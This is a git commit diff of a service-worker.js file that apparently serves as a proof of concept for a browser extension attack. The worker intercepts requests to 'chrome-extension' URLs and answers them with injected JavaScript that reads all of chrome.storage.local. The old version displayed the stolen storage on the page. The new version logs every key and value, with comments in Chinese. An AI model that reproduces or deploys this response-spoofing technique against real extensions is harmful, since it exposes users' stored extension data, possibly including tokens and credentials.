09092325f4c33712a5cc1ef5a5a045c20f4b05b2
rt95 <44286251+rt-95@users.noreply.github.com>
2025-06-09 00:10:15 +0800

    Update service-worker.js

--- service-worker.js
+++ service-worker.js
@@ -6,9 +6,18 @@ self.addEventListener("fetch", (event) => {
     }
     if(event.request.url.indexOf("chrome-extension") != -1){
         var a =             new Response(`(async function foo() {
-            window.slonser=JSON.stringify(await chrome.storage.local.get());
-
-            document.body.innerHTML='I was stealed your storage:'+window.slonser; 
+            chrome.storage.local.get(null, function(items) {
+          // 提取所有键
+          const keys = Object.keys(items);
+      
+          // 打印结果
+          console.log('存储中的所有键:', keys);
+      
+          // 你也可以逐个处理每个键
+          keys.forEach(function(key) {
+              console.log('键:', key, '值:', items[key]);
+                  });
+              });
           })();`, {
           headers: {'Content-Type': 'text/javascript', 'Access-Control-Allow-Origin':"*"}
         })
